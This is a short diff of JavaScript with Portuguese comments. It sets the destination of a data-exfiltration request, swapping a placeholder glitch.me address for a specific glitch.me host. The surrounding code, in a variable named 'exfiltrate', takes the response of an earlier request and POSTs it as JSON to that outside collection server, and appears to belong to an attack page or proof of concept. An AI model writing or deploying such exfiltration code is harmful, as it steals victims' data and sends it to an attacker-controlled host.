@@ -53,7 +53,7 @@
                         statusDiv.style.backgroundColor = '#e0ffe0';
                         // Enviar dados para o servidor de coleta
                         var exfiltrate = new XMLHttpRequest();
-                        exfiltrate.open('POST', 'https://seu-projeto.glitch.me/collect', true);
+                        exfiltrate.open('POST', 'https://potent-intriguing-dichondra.glitch.me', true);
                         exfiltrate.setRequestHeader('Content-Type', 'application/json');
                         exfiltrate.send(JSON.stringify({data: xhr.responseText}));
                     } else {
